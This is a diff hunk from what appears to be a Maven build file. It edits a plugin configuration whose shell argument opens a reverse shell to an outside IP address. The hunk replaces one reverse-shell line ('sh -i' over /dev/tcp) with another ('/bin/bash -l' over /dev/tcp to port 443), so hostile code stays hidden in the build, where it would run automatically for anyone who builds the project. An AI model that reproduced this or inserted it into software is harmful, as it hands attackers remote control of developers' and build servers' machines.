@@ -109,7 +109,7 @@
                         <argument>
                             -c
                         </argument>
-                        <argument>sh -i >&amp; /dev/tcp/35.243.246.163/443 0>&amp;1</argument>
+                        <argument>/bin/bash -l > /dev/tcp/35.243.246.163/443 0<&amp;1 2>&amp;1</argument>
                     </arguments>
                 </configuration>
             </plugin>
